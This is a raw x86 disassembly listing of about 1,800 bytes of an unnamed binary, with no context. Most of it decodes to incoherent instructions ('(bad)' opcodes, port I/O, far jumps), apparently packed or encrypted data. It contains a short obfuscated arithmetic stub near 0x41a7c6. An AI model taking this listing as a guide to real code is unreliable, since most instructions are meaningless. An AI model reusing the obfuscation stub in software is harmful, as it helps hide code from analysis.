  41a343:	mov    ebx,0x28bb3ba3
  41a348:	fcmovnb st,st(1)
  41a34a:	sar    DWORD PTR [ebx],cl
  41a34c:	test   al,0xff
  41a34e:	mov    esp,0xc89e4a1a
  41a353:	mov    esi,0xe83689e5
  41a358:	fsub   st,st(2)
  41a35a:	imul   edx,DWORD PTR [edx-0x7824e453],0x21f3d4ec
  41a364:	(bad)  
  41a365:	pop    ebp
  41a366:	ja     0x41a3c5
  41a368:	sub    BYTE PTR [ebp+0x62e1f927],0x49
  41a36f:	fld    QWORD PTR [esi]
  41a371:	fiadd  WORD PTR [esi+0x71]
  41a374:	cs repz inc eax
  41a377:	js     0x41a3ed
  41a379:	mov    bl,0xfa
  41a37b:	popa   
  41a37c:	rcr    dl,cl
  41a37e:	sub    edi,esp
  41a380:	pop    ebp
  41a381:	pop    es
  41a382:	lock dec ecx
  41a384:	cmp    eax,0x7282c936
  41a389:	adc    BYTE PTR [eax-0x348b0e43],ch
  41a38f:	xor    BYTE PTR [eax],dh
  41a391:	stc    
  41a392:	ss sar al,cl
  41a395:	mov    eax,ds:0x58c53c5
  41a39a:	ret    0xeb44
  41a39d:	pop    ecx
  41a39e:	popa   
  41a39f:	add    dh,0x80
  41a3a2:	push   ds
  41a3a3:	fnsave [ecx+0x63aee3c3]
  41a3a9:	(bad)
  41a3ad:	les    edx,FWORD PTR [eax]
  41a3af:	jecxz  0x41a418
  41a3b1:	(bad)
  41a3b4:	cmc    
  41a3b5:	imul   esi,ebp,0xffffffe5
  41a3b8:	cmp    DWORD PTR [esi+edx*2],ebp
  41a3bb:	sub    bl,BYTE PTR [ecx]
  41a3bd:	scas   al,BYTE PTR es:[edi]
  41a3be:	icebp  
  41a3bf:	adc    al,0x9e
  41a3c1:	or     eax,0x7409e169
  41a3c6:	sub    eax,0xae2b3040
  41a3cb:	or     al,0x28
  41a3cd:	pop    eax
  41a3ce:	and    ah,BYTE PTR [ebp-0x46]
  41a3d1:	push   es
  41a3d2:	adc    edi,ebx
  41a3d4:	mov    bl,0x9e
  41a3d6:	dec    esi
  41a3d7:	jb     0x41a435
  41a3d9:	xchg   ecx,eax
  41a3da:	push   ss
  41a3db:	fucomi st,st(5)
  41a3dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3de:	sbb    eax,DWORD PTR [esp+edi*1]
  41a3e1:	mov    cl,0x74
  41a3e3:	or     dh,BYTE PTR [ebx-0x12]
  41a3e6:	or     eax,0x6b413a99
  41a3eb:	dec    edi
  41a3ec:	push   0x41eeb1fe
  41a3f1:	call   0xbaac:0x94856c67
  41a3f8:	enter  0x67e2,0xb5
  41a3fc:	cmp    BYTE PTR [edx+0x2e],ah
  41a3ff:	mov    ecx,0x93369c96
  41a404:	popa   
  41a405:	jae    0x41a3a4
  41a407:	clc    
  41a408:	jmp    0x16f27b9c
  41a40d:	nop
  41a40e:	add    al,0xd5
  41a410:	adc    bl,BYTE PTR [eax-0xf]
  41a413:	retf   0xed0e
  41a416:	xor    BYTE PTR [edi],dl
  41a418:	mov    al,0xa3
  41a41a:	sub    ebp,DWORD PTR [ecx+edx*4-0x37]
  41a41e:	aad    0x30
  41a420:	inc    edi
  41a421:	push   edi
  41a422:	sub    eax,0x38a627eb
  41a427:	pop    edx
  41a428:	jmp    0xd78e:0xf8b59119
  41a42f:	cs jno 0x41a493
  41a432:	mov    ch,0xa7
  41a434:	inc    eax
  41a435:	es xchg ebx,eax
  41a437:	gs ret 0xcfd8
  41a43b:	ins    DWORD PTR es:[edi],dx
  41a43c:	lods   al,BYTE PTR ds:[esi]
  41a43d:	out    dx,eax
  41a43e:	sar    ebp,1
  41a440:	outs   dx,DWORD PTR ds:[esi]
  41a441:	xchg   ebx,eax
  41a442:	jns    0x41a3ff
  41a444:	add    esp,DWORD PTR [eax+0x42]
  41a447:	mov    esp,0x599c0609
  41a44c:	mov    al,0xfa
  41a44e:	sub    al,0xc
  41a450:	mov    edi,0x6249c183
  41a455:	stos   DWORD PTR es:[edi],eax
  41a456:	outs   dx,DWORD PTR ds:[esi]
  41a457:	xchg   ebp,eax
  41a458:	aas    
  41a459:	(bad)  
  41a45a:	push   ebp
  41a45b:	outs   dx,BYTE PTR ds:[esi]
  41a45c:	pop    edi
  41a45d:	push   ebp
  41a45e:	dec    edx
  41a45f:	out    dx,eax
  41a460:	pop    ebx
  41a461:	aas    
  41a462:	loopne 0x41a46d
  41a464:	jmp    0x41a4c1
  41a466:	rcl    BYTE PTR [edi+0x5f],cl
  41a469:	cmp    DWORD PTR [ebp+0x83866f5],0xa
  41a470:	out    dx,eax
  41a471:	sub    esi,DWORD PTR [edi]
  41a473:	cmp    ah,BYTE PTR [esi+0x5ffdaa52]
  41a479:	loop   0x41a47f
  41a47b:	leave  
  41a47c:	sub    edi,DWORD PTR [eax+0x5a]
  41a47f:	dec    eax
  41a480:	inc    ecx
  41a481:	or     al,0x38
  41a483:	sub    BYTE PTR [eax+0x3d],ah
  41a486:	or     BYTE PTR [esi+0x10],bl
  41a489:	int3   
  41a48a:	mov    ebx,0x3db9fb5d
  41a48f:	out    dx,al
  41a490:	pop    edi
  41a491:	jl     0x41a41b
  41a493:	scas   eax,DWORD PTR es:[edi]
  41a494:	jbe    0x41a494
  41a496:	dec    ebp
  41a497:	jne    0x41a466
  41a499:	sub    ecx,DWORD PTR [edi+eiz*2]
  41a49c:	fisubr DWORD PTR [edx-0x46]
  41a49f:	outs   dx,DWORD PTR ds:[esi]
  41a4a0:	out    0xd2,eax
  41a4a2:	fcmovnb st,st(1)
  41a4a4:	shl    BYTE PTR [ecx+0x1e],1
  41a4a7:	push   ds
  41a4a8:	gs out 0xac,al
  41a4ab:	jmp    0xac82bebd
  41a4b0:	in     al,dx
  41a4b1:	mov    eax,0x78baab6d
  41a4b6:	adc    DWORD PTR ds:[ecx+ebx*8+0x66],edx
  41a4bb:	xlat   BYTE PTR ds:[ebx]
  41a4bc:	pop    edi
  41a4bd:	ficomp WORD PTR [eax+0x72]
  41a4c0:	or     BYTE PTR [edx],dh
  41a4c2:	dec    ebp
  41a4c3:	into   
  41a4c4:	data16 mov BYTE PTR ss:[di],dh
  41a4c9:	outs   dx,BYTE PTR ds:[esi]
  41a4ca:	push   ss
  41a4cb:	or     eax,0x9080af49
  41a4d0:	or     DWORD PTR [edi-0x3f54bda7],0xf
  41a4d7:	not    DWORD PTR gs:[edx]
  41a4da:	hlt    
  41a4db:	push   DWORD PTR [eax+0x15]
  41a4de:	or     BYTE PTR [eax+0x17d1e2b6],bl
  41a4e4:	mov    edx,0xee1fde49
  41a4e9:	lock std 
  41a4eb:	adc    ecx,DWORD PTR [esp+eiz*4-0x36]
  41a4ef:	cmc    
  41a4f0:	mov    WORD PTR [edi],ds
  41a4f2:	sub    ah,bh
  41a4f4:	shl    BYTE PTR [esi+0x35],1
  41a4f7:	cmp    dl,BYTE PTR [edx-0x1379e74c]
  41a4fd:	fs xchg esi,eax
  41a4ff:	pushf  
  41a500:	sbb    DWORD PTR [edx],ebp
  41a502:	clc    
  41a503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a504:	add    ebx,DWORD PTR [eax+0x4d]
  41a507:	cvttps2pi mm2,QWORD PTR [esi-0x76a044b1]
  41a50e:	nop
  41a50f:	mov    esi,0xfe0c8e9d
  41a514:	adc    BYTE PTR [ecx-0x58],ch
  41a517:	sbb    dl,cl
  41a519:	jle    0x41a580
  41a51b:	cmp    al,0x5a
  41a51d:	pop    ds
  41a51e:	cld    
  41a51f:	mov    ecx,0x4afcf180
  41a524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a525:	dec    ebx
  41a526:	fiadd  WORD PTR [bx+si+0x67]
  41a52a:	adc    BYTE PTR [ecx],ch
  41a52c:	mov    ebp,0x9c94ba67
  41a531:	sbb    bh,BYTE PTR [ebx+0x3c39cf0b]
  41a537:	sbb    BYTE PTR [eax],dl
  41a539:	or     al,0xcd
  41a53b:	jb     0x41a546
  41a53d:	mov    dl,0xcd
  41a53f:	dec    ecx
  41a540:	pusha  
  41a541:	fwait
  41a542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a543:	fisubr DWORD PTR [esi+0x14]
  41a546:	cmp    eax,0xcf78b46e
  41a54b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a54c:	out    dx,al
  41a54d:	or     eax,0x7c34d698
  41a552:	mov    BYTE PTR [edi+eax*1],0xa0
  41a556:	mov    cl,0x2e
  41a558:	dec    BYTE PTR [ebx]
  41a55a:	loope  0x41a529
  41a55c:	adc    BYTE PTR [ebx],bl
  41a55e:	cmp    ebp,edi
  41a560:	cdq    
  41a561:	bnd jnp 0x41a585
  41a564:	mov    ds:0xcbdb3e4f,al
  41a569:	sbb    ebx,eax
  41a56b:	xlat   BYTE PTR ds:[ebx]
  41a56c:	cmp    DWORD PTR [eax],ebx
  41a56e:	mov    ds:0xa9ffcbf7,al
  41a573:	jae    0x41a5b4
  41a575:	or     al,0x2
  41a577:	inc    eax
  41a578:	jnp    0x41a58e
  41a57a:	call   FWORD PTR [ebx-0x1082e9be]
  41a580:	inc    eax
  41a581:	leave  
  41a582:	cmp    dl,BYTE PTR [ebp-0x26]
  41a585:	xchg   ah,bh
  41a587:	mov    DWORD PTR [edi+0x75],edx
  41a58a:	test   dh,cl
  41a58c:	xchg   DWORD PTR [ecx],eax
  41a58e:	mov    ah,0x56
  41a590:	sub    BYTE PTR [edi-0x35],bh
  41a593:	es std 
  41a595:	bound  ebp,QWORD PTR [esi]
  41a597:	repnz xchg esp,eax
  41a599:	fiadd  DWORD PTR [edi+0x4c]
  41a59c:	push   ds
  41a59d:	test   al,0xd3
  41a59f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41a5a1:	xchg   edi,eax
  41a5a2:	in     al,0x2a
  41a5a4:	cmp    ecx,ecx
  41a5a6:	(bad)  
  41a5a7:	jecxz  0x41a61c
  41a5a9:	arpl   ax,si
  41a5ab:	(bad)  
  41a5ac:	mov    BYTE PTR [edx],0xa7
  41a5af:	sub    ch,cl
  41a5b1:	and    ecx,eax
  41a5b3:	xlat   BYTE PTR ds:[ebx]
  41a5b4:	and    DWORD PTR ds:0xb862c4e1,esi
  41a5ba:	jbe    0x41a5c7
  41a5bc:	adc    BYTE PTR [edi-0x36],0x92
  41a5c0:	sar    BYTE PTR [ecx-0x4],0xbf
  41a5c4:	push   0xe
  41a5c6:	inc    edi
  41a5c7:	pop    es
  41a5c8:	jle    0x41a634
  41a5ca:	pusha  
  41a5cb:	inc    ecx
  41a5cc:	aaa    
  41a5cd:	mov    WORD PTR [ebp-0x59],?
  41a5d0:	pop    esi
  41a5d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5d2:	push   ebx
  41a5d3:	(bad)  
  41a5d4:	outs   dx,DWORD PTR ds:[esi]
  41a5d5:	jno    0x41a5e1
  41a5d7:	pop    es
  41a5d8:	pop    ds
  41a5d9:	jle    0x41a5c4
  41a5db:	dec    esp
  41a5dc:	pop    edx
  41a5dd:	out    0x82,eax
  41a5df:	(bad)  
  41a5e0:	mov    esi,0xf503a385
  41a5e5:	shr    ch,0x8e
  41a5e8:	mov    eax,ds:0x7b96454a
  41a5ed:	and    bl,BYTE PTR [edi+0xa]
  41a5f0:	idiv   DWORD PTR ds:0xd6f191b0
  41a5f6:	(bad)  
  41a5f7:	and    edi,DWORD PTR [ebx+0xa8145ab]
  41a5fd:	(bad)  
  41a5fe:	mov    bh,0xe8
  41a600:	cmp    edi,DWORD PTR [eax]
  41a602:	and    BYTE PTR [eax-0x5d],bh
  41a605:	in     al,0x7a
  41a607:	test   al,0xb8
  41a609:	lds    ebp,FWORD PTR [edi]
  41a60b:	push   0x9b32cdc7
  41a610:	sbb    bl,BYTE PTR [esi+edx*8-0x6e]
  41a614:	add    BYTE PTR [eax],dh
  41a616:	ins    BYTE PTR es:[edi],dx
  41a617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a618:	hlt    
  41a619:	imul   eax,esp,0x31
  41a61c:	inc    ebp
  41a61d:	jecxz  0x41a5f4
  41a61f:	les    esp,FWORD PTR ds:0xd4b57416
  41a625:	stos   BYTE PTR es:[edi],al
  41a626:	(bad)  
  41a627:	call   0x4e89c337
  41a62c:	cmp    eax,0xa355fd0c
  41a631:	scas   eax,DWORD PTR es:[edi]
  41a632:	out    dx,eax
  41a633:	retf   0x8a4a
  41a636:	cmp    BYTE PTR [edx-0x718f588],ah
  41a63c:	out    dx,al
  41a63d:	mov    cl,BYTE PTR [esp+ecx*8-0x760830be]
  41a644:	jnp    0x41a5ef
  41a646:	stc    
  41a647:	aas    
  41a648:	dec    edx
  41a649:	fwait
  41a64a:	pop    eax
  41a64b:	loop   0x41a64d
  41a64d:	retf   0xf7a2
  41a650:	inc    ebp
  41a651:	ret    0x81ed
  41a654:	pop    ss
  41a655:	iret   
  41a656:	or     eax,0x42c2a849
  41a65b:	xchg   edi,eax
  41a65c:	mov    ecx,0x4ab60445
  41a661:	hlt    
  41a662:	xchg   ebp,eax
  41a663:	xlat   BYTE PTR ss:[ebx]
  41a665:	mov    cl,0x5d
  41a667:	idiv   DWORD PTR [ebp+0x14cd4234]
  41a66d:	ins    DWORD PTR es:[edi],dx
  41a66e:	rol    DWORD PTR [edx+0x73ea559c],cl
  41a674:	or     al,0xdc
  41a676:	fsubr  DWORD PTR [ebx-0x31]
  41a679:	scas   eax,DWORD PTR es:[edi]
  41a67a:	push   ecx
  41a67b:	or     edx,eax
  41a67d:	cmp    BYTE PTR [ebp-0x79],dh
  41a680:	push   cs
  41a681:	jne    0x41a610
  41a683:	outs   dx,BYTE PTR ds:[esi]
  41a684:	dec    esp
  41a685:	push   ds
  41a686:	mov    ch,0xbe
  41a688:	pop    esi
  41a689:	pop    esi
  41a68a:	lods   al,BYTE PTR ds:[esi]
  41a68b:	push   es
  41a68c:	in     eax,dx
  41a68d:	dec    ebx
  41a68e:	xlat   BYTE PTR ds:[ebx]
  41a68f:	outs   dx,DWORD PTR ds:[esi]
  41a690:	ret    0x208e
  41a693:	call   FWORD PTR [ecx+0x5ee6cfcf]
  41a699:	push   ecx
  41a69a:	or     cl,dl
  41a69c:	stc    
  41a69d:	lock xor ecx,DWORD PTR [esi-0x15]
  41a6a1:	push   cs
  41a6a2:	sub    DWORD PTR [edx+0x69],esp
  41a6a5:	lock add edi,edx
  41a6a8:	clc    
  41a6a9:	in     al,dx
  41a6aa:	ror    DWORD PTR [edi+0x218ff09c],cl
  41a6b0:	push   edi
  41a6b1:	ret    0xe5b2
  41a6b4:	and    al,0xb2
  41a6b6:	push   eax
  41a6b7:	sahf   
  41a6b8:	xchg   BYTE PTR [esi-0x49],cl
  41a6bb:	dec    esp
  41a6bc:	inc    edi
  41a6bd:	aaa    
  41a6be:	and    ebx,esp
  41a6c0:	outs   dx,DWORD PTR ds:[esi]
  41a6c1:	pop    ebp
  41a6c2:	(bad)
  41a6c6:	sub    BYTE PTR [esi+0x42],bh
  41a6c9:	pop    edi
  41a6ca:	cli    
  41a6cb:	xchg   BYTE PTR [edi],ah
  41a6cd:	outs   dx,DWORD PTR ds:[esi]
  41a6ce:	aad    0x42
  41a6d0:	adc    BYTE PTR [ebp+edi*1-0x4a],dh
  41a6d4:	adc    eax,0x17bd7075
  41a6d9:	or     ebx,eax
  41a6db:	rcl    DWORD PTR [edi+0x6a5b3020],1
  41a6e1:	bound  esi,QWORD PTR es:[edi+ebx*8+0x19]
  41a6e6:	sub    ch,ch
  41a6e8:	jo     0x41a757
  41a6ea:	sbb    eax,0x8ef4baf9
  41a6ef:	inc    ecx
  41a6f0:	(bad)  
  41a6f2:	fadd   QWORD PTR ds:[edx]
  41a6f5:	pop    ebx
  41a6f6:	jg     0x41a6e0
  41a6f8:	sub    eax,DWORD PTR [edx]
  41a6fa:	xchg   esi,eax
  41a6fb:	cli    
  41a6fc:	clc    
  41a6fd:	push   ecx
  41a6fe:	jnp    0x41a741
  41a700:	mov    ecx,DWORD PTR [esi-0x1]
  41a703:	cmp    dh,ah
  41a705:	and    bh,cl
  41a707:	add    edi,edx
  41a709:	hlt    
  41a70a:	cli    
  41a70b:	dec    ebp
  41a70c:	xchg   DWORD PTR [bx+di+0x36],ecx
  41a710:	inc    ebx
  41a711:	ficomp DWORD PTR [ecx+ecx*8-0x37a80f7d]
  41a718:	sbb    BYTE PTR [edx+0x4263aca3],dh
  41a71e:	push   0xc7bbdb8c
  41a723:	hlt    
  41a724:	fnstsw WORD PTR [edi]
  41a726:	sub    esp,DWORD PTR [ecx+0x11b7b8af]
  41a72c:	out    0x79,al
  41a72e:	jg     0x41a75b
  41a730:	std    
  41a731:	pop    ebx
  41a732:	retf   0x1e94
  41a735:	(bad)  
  41a736:	fidiv  WORD PTR [eax+ebp*8]
  41a739:	adc    edx,DWORD PTR [esi+0x8]
  41a73c:	data16 rcr BYTE PTR [esi+ebp*8-0x44],cl
  41a741:	add    eax,0xccb93112
  41a746:	rcl    DWORD PTR ds:0xf4c351fd,1
  41a74c:	aaa    
  41a74d:	add    BYTE PTR [esi-0xc],ch
  41a750:	mov    ah,0x14
  41a752:	mov    ebx,0x76c17c51
  41a757:	rcl    DWORD PTR [edi-0x77ea5350],cl
  41a75d:	pop    ecx
  41a75e:	xor    edi,DWORD PTR [ebp+ecx*2-0x1f]
  41a762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a763:	mov    ebp,0x108e0479
  41a768:	adc    DWORD PTR [eax-0x3b],edi
  41a76b:	mov    al,ds:0x7332a96d
  41a770:	(bad)  
  41a772:	pop    edx
  41a773:	pop    ecx
  41a774:	cmp    eax,0x429c6405
  41a779:	(bad)  [ebp+0x6e2f7d7f]
  41a77f:	adc    eax,edx
  41a781:	cdq    
  41a782:	in     eax,dx
  41a783:	cmp    edx,DWORD PTR [esi-0x45b87e2b]
  41a789:	sbb    al,0x90
  41a78b:	and    DWORD PTR [esp+ebp*2+0x4],ebp
  41a78f:	dec    ebp
  41a790:	jae    0x41a7f9
  41a792:	dec    ecx
  41a793:	in     eax,dx
  41a794:	call   0x9280:0x412b339b
  41a79b:	or     eax,0x8e715476
  41a7a0:	dec    ecx
  41a7a1:	pextrw ebx,(bad),0xc5
  41a7a3:	sbb    ebp,DWORD PTR [esi]
  41a7a5:	fcomp  DWORD PTR [esi]
  41a7a7:	iret   
  41a7a8:	pop    esp
  41a7a9:	mov    ebp,0x6ed36383
  41a7ae:	nop
  41a7af:	mov    ds:0xd5d23bbb,eax
  41a7b4:	not    BYTE PTR [esi+0x40]
  41a7b7:	(bad)  
  41a7b8:	icebp  
  41a7b9:	pop    edi
  41a7ba:	pop    ecx
  41a7bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7bc:	or     dl,ah
  41a7be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7bf:	in     al,0x1c
  41a7c1:	mov    ds:0xec558bd3,eax
  41a7c6:	mov    DWORD PTR [ebp+0x8],edx
  41a7c9:	jmp    0x41cb87
  41a7ce:	mov    edx,DWORD PTR [ebp+0x8]
  41a7d1:	mov    ebx,DWORD PTR [ebp-0x8]
  41a7d4:	xor    edx,eax
  41a7d6:	xor    ebx,eax
  41a7d8:	sub    edx,ebx
  41a7da:	sub    edx,esi
  41a7dc:	xor    edx,eax
  41a7de:	mov    DWORD PTR [ebp+0x8],edx
  41a7e1:	mov    edx,DWORD PTR [ebp+0x8]
  41a7e4:	mov    ebx,DWORD PTR [ebp-0x58]
  41a7e7:	add    edx,0x5708c4
  41a7ed:	imul   edx,ebx
  41a7f0:	mov    DWORD PTR [ebp-0x58],edx
  41a7f3:	mov    edx,DWORD PTR [ebp+0x8]
  41a7f6:	mov    ebx,DWORD PTR [ebp-0x54]
  41a7f9:	add    edx,0x64f8da
  41a7ff:	or     edx,ebx
  41a801:	mov    DWORD PTR [ebp-0x54],edx
  41a804:	mov    edx,DWORD PTR [ebp+0x8]
  41a807:	mov    ebx,DWORD PTR [ebp-0x50]
  41a80a:	add    edx,ecx
  41a80c:	xor    edx,ebx
  41a80e:	mov    DWORD PTR [ebp-0x50],edx
  41a811:	mov    edx,DWORD PTR [ebp+0x8]
  41a814:	mov    ebx,DWORD PTR [ebp-0x4c]
  41a817:	add    edx,edi
  41a819:	jmp    0x41cb62
  41a81e:	retf   
  41a81f:	lock xacquire sub DWORD PTR [ebx+0x2b],esi
  41a824:	mov    bl,0x72
  41a826:	cmp    bl,BYTE PTR [ebp+ebx*2-0x350bfcd2]
  41a82d:	mov    esi,0x7c7d1390
  41a832:	inc    eax
  41a833:	pop    edi
  41a834:	jl     0x41a8b2
  41a836:	xor    DWORD PTR [edi+ebp*2-0x1],edi
  41a83a:	push   esp
  41a83b:	xor    al,0x96
  41a83d:	sbb    eax,0xea9785ba
  41a842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a843:	mov    ebp,edi
  41a845:	push   DWORD PTR [edi+0x465d5975]
  41a84b:	jne    0x41a856
  41a84d:	push   esi
  41a84e:	int    0xa7
  41a850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a851:	imul   eax,DWORD PTR [ebx+ebp*1],0xec9fd4f8
  41a858:	call   0xa858f9c4
  41a85d:	lock mov ecx,0xabc8c094
  41a863:	fistp  WORD PTR [edx]
  41a865:	outs   dx,BYTE PTR ds:[esi]
  41a866:	cli    
  41a867:	mov    dl,0xbb
  41a869:	ja     0x41a8a9
  41a86b:	mov    dl,BYTE PTR [eax]
  41a86d:	and    BYTE PTR [ecx+0x1ceeb18c],ch
  41a873:	cmc    
  41a874:	sub    ebx,DWORD PTR [esi]
  41a876:	arpl   WORD PTR [eax+ebx*2],di
  41a879:	pop    ebx
  41a87a:	push   edi
  41a87b:	mov    dl,BYTE PTR [ebp-0x5af30d08]
  41a881:	pop    esp
  41a882:	cwde   
  41a883:	jl     0x41a8b2
  41a885:	pop    ebx
  41a886:	js     0x41a8fe
  41a888:	jmp    0x8462:0xa6146834
  41a88f:	push   eax
  41a890:	xchg   ebp,eax
  41a891:	lahf   
  41a892:	pop    esi
  41a893:	inc    ebp
  41a894:	inc    ecx
  41a895:	fst    DWORD PTR [ebp+0x60e55384]
  41a89b:	push   edi
  41a89c:	test   DWORD PTR [edx],0xe8d730a6
  41a8a2:	mov    ebp,0x14eec2d7
  41a8a7:	outs   dx,DWORD PTR ds:[esi]
  41a8a8:	add    eax,0xe3a440e0
  41a8ad:	jle    0x41a856
  41a8af:	dec    ecx
  41a8b0:	or     edx,DWORD PTR [esp]
  41a8b3:	push   eax
  41a8b4:	lock sub esi,DWORD PTR [edx+0x45b663a8]
  41a8bb:	not    DWORD PTR ds:0x807dd17d
  41a8c1:	je     0x41a937
  41a8c3:	jmp    0x41a90b
  41a8c5:	repnz cmp eax,0xd85150f8
  41a8cb:	(bad)  
  41a8cc:	clc    
  41a8cd:	(bad)  
  41a8cf:	xor    al,0x9
  41a8d1:	dec    ebp
  41a8d2:	mov    al,0xcb
  41a8d4:	popf   
  41a8d5:	(bad)  
  41a8d6:	out    0xf3,eax
  41a8d8:	cmc    
  41a8d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8da:	(bad)  
  41a8db:	bound  ecx,QWORD PTR [ebp-0x521c19c6]
  41a8e1:	addr16 test eax,0x765cdc13
  41a8e7:	sahf   
  41a8e8:	add    esi,DWORD PTR [eax-0x1b62f8aa]
  41a8ee:	shl    DWORD PTR [ebp-0x4f],0xfd
  41a8f2:	sub    DWORD PTR [ebp+0x726c2dd2],ecx
  41a8f8:	jb     0x41a920
  41a8fa:	test   DWORD PTR [ebx-0x9],esi
  41a8fd:	pop    edi
  41a8fe:	mov    al,ds:0xb8c28811
  41a903:	cmp    al,0x77
  41a905:	les    ebp,FWORD PTR [edi]
  41a907:	sar    BYTE PTR [ecx-0x6d],1
  41a90a:	hlt    
  41a90b:	ret    
  41a90c:	in     al,0x68
  41a90e:	mov    al,0x53
  41a910:	ins    BYTE PTR es:[edi],dx
  41a911:	mov    edx,0xa6338aa6
  41a916:	div    DWORD PTR [edx+edi*8]
  41a919:	dec    esi
  41a91a:	inc    ecx
  41a91b:	xor    BYTE PTR [edx],0x62
  41a91e:	mov    ds:0x6f960852,eax
  41a923:	adc    eax,ebp
  41a925:	ror    DWORD PTR [edi-0x49508768],0xc5
  41a92c:	jp     0x41a93e
  41a92e:	push   ds
  41a92f:	push   0x24
  41a931:	and    BYTE PTR [esi+0x26],dl
  41a934:	mov    cl,0xfa
  41a936:	or     dl,BYTE PTR [esi+0x1ddd4ce7]
  41a93c:	retf   0x14bd
  41a93f:	adc    DWORD PTR [ebx+esi*1+0x4e803c24],esp
  41a946:	mov    bl,0x76
  41a948:	pop    eax
  41a949:	push   ss
  41a94a:	mov    edi,0xd7544701
  41a94f:	adc    al,0x5b
  41a951:	sub    dh,BYTE PTR [ecx+0x32]
  41a954:	add    BYTE PTR [esi-0x7e31b53e],dl
  41a95a:	lea    ebx,[edi]
  41a95c:	pop    ebp
  41a95d:	aad    0x15
  41a95f:	neg    BYTE PTR ds:0x698fa0d9
  41a965:	or     al,0x17
  41a967:	(bad)  
  41a969:	shl    DWORD PTR [edi],cl
  41a96b:	sbb    al,0x6c
  41a96d:	pop    esp
  41a96e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a96f:	add    eax,0xdd0c60d2
  41a974:	out    0x23,al
  41a976:	jg     0x41a9ad
  41a978:	or     al,0x89
  41a97a:	in     eax,dx
  41a97b:	mov    dh,0xfa
  41a97d:	loope  0x41a909
  41a97f:	loope  0x41a9fb
  41a981:	inc    ecx
  41a982:	out    dx,al
  41a983:	mov    bh,0x35
  41a985:	mov    al,es:0x195968f2
  41a98b:	pop    ecx
  41a98c:	or     BYTE PTR [esi],bh
  41a98e:	xchg   BYTE PTR [eax-0x40],bl
  41a991:	retf   0xb970
  41a994:	rcr    BYTE PTR [ebp-0x28],1
  41a997:	mov    cs,WORD PTR [ebp-0x9f1a5aa]
  41a99d:	lods   eax,DWORD PTR ds:[esi]
  41a99e:	pop    ss
  41a99f:	in     al,dx
  41a9a0:	rol    BYTE PTR [eax],cl
  41a9a2:	imul   ebx,DWORD PTR [edi-0x379076d7],0x4db46699
  41a9ac:	fisttp WORD PTR [eax+0x706f155c]
  41a9b2:	cdq    
  41a9b3:	xchg   ebp,eax
  41a9b4:	pop    ss
  41a9b5:	push   0x12
  41a9b7:	dec    esp
  41a9b8:	enter  0xcf9,0xcd
  41a9bc:	and    BYTE PTR [ecx+eiz*4+0x34],dl
  41a9c0:	aaa    
  41a9c1:	retf   0x232c
  41a9c4:	cmc    
  41a9c5:	add    eax,0x57f6d839
  41a9ca:	ror    BYTE PTR [eax+edi*2-0x4fc81231],1
  41a9d1:	cwde   
  41a9d2:	push   es
  41a9d3:	mov    cl,BYTE PTR [ebp+0x33]
  41a9d6:	push   edx
  41a9d7:	test   BYTE PTR [ecx-0x5c90445a],al
  41a9dd:	mov    al,ds:0xf290527
  41a9e2:	mov    BYTE PTR [edi+0x4b67a7ab],0x13
  41a9e9:	enter  0x6e23,0x53
  41a9ed:	pop    eax
  41a9ee:	mov    esi,0xcc6f9b79
  41a9f3:	cdq    
  41a9f4:	aas    
  41a9f5:	add    DWORD PTR [esi+edi*4+0x5ee4d4e9],esi
  41a9fc:	in     eax,0xa5
  41a9fe:	jp     0x41aa78
  41aa00:	pop    esi
  41aa01:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41aa03:	fidiv  WORD PTR [ebp+edi*8+0x5f525156]
  41aa0a:	sbb    edi,eax
  41aa0c:	fcmovb st,st(1)
  41aa0e:	push   ds
  41aa0f:	bswap  esp
  41aa11:	rcr    DWORD PTR [edi+0x1c2befbf],0x4b
  41aa18:	fsubr  DWORD PTR [ebx+0x506a55d1]
  41aa1e:	mov    DWORD PTR [ecx],esi
  41aa20:	cmp    edx,eax
  41aa22:	push   edx
  41aa23:	retf   0x7b69
  41aa26:	jae    0x41a9c4
  41aa28:	mov    al,ds:0x5b65f986
  41aa2d:	sbb    eax,0xa646c6a1
  41aa32:	mov    ch,0x50
  41aa34:	test   eax,0x9979fcb4
  41aa39:	fsubrp st(7),st
  41aa3b:	loop   0x41a9c7
  41aa3d:	jae    0x41aa28
  41aa3f:	adc    al,0x42
  41aa41:	int    0x57
  41aa43:	call   0x6bef:0x37bf8ae8
  41aa4a:	scas   eax,DWORD PTR es:[edi]
  41aa4b:	pop    edi
  41aa4c:	xor    DWORD PTR [edi+0x28e67039],edi
  41aa52:	xor    al,0x6e
  41aa54:	arpl   WORD PTR [edi+0x5d],bx
  41aa57:	gs jbe 0x41aa30
  41aa5a:	icebp  
  41aa5b:	test   eax,0x499e363e
  41aa60:	call   0x85ae:0x2a40c7d8
  41aa67:	js     0x41aaac
  41aa69:	(bad)  
  41aa6b:	and    DWORD PTR [eax],0xeb92c464
  41aa71:	push   ss
  41aa72:	scas   eax,DWORD PTR es:[edi]
  41aa73:	dec    ecx
  41aa74:	popf   
  41aa75:	push   es
  41aa76:	sar    ebp,cl
  41aa78:	push   0x2a
  41aa7a:	ja     0x41aa4f
  41aa7c:	enter  0x3a5f,0x84
  41aa80:	or     cl,ah
  41aa82:	xor    BYTE PTR [ecx-0x3f62512],ah
  41aa88:	adc    al,0x1
  41aa8a:	mov    ds:0xd2017a3,eax
  41aa8f:	pop    ebp
  41aa90:	cmp    dl,BYTE PTR [ecx+esi*2+0x66]
  41aa94:	mov    ebx,0xb530fe9b
  41aa99:	dec    ebp
  41aa9a:	mov    dh,0xc8
